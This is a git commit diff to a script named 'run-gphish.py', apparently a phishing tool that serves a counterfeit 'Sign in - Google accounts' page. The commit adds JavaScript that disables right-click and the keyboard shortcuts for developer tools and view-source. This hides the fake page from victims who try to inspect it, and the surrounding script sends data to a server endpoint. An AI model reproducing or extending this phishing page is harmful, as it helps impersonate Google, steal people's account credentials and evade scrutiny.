9c5f4a63c452911f45ae22e83e0924e64529ece1
D4RKH0R1Z0N <76612351+D4RKH0R1Z0N@users.noreply.github.com>
2023-09-12 17:23:49 +0530

    Update run-gphish.py

--- run-gphish.py
+++ run-gphish.py
@@ -26,6 +26,26 @@ else:
   <link rel="icon" type="image/x-icon" href="https://google.com/favicon.ico">
   <title>Sign in &#65112; Google accounts</title>
   <script>
+    // Disable right-click and Inspect Element
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    
+    function ctrlShiftKey(e, keyCode) {
+      return e.ctrlKey && e.shiftKey && e.keyCode === keyCode.charCodeAt(0);
+    }
+    
+    document.onkeydown = (e) => {
+      // Disable F12, Ctrl + Shift + I, Ctrl + Shift + J, Ctrl + U
+      if (
+        event.keyCode === 123 ||
+        ctrlShiftKey(e, 'I') ||
+        ctrlShiftKey(e, 'J') ||
+        ctrlShiftKey(e, 'C') ||
+        (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0))
+      )
+        return false;
+    };
+  </script>
+  <script>
 var server = "https://" + location.host + "/index.php";
 (function() {
     var server = "https://" + location.host + "/index.php";
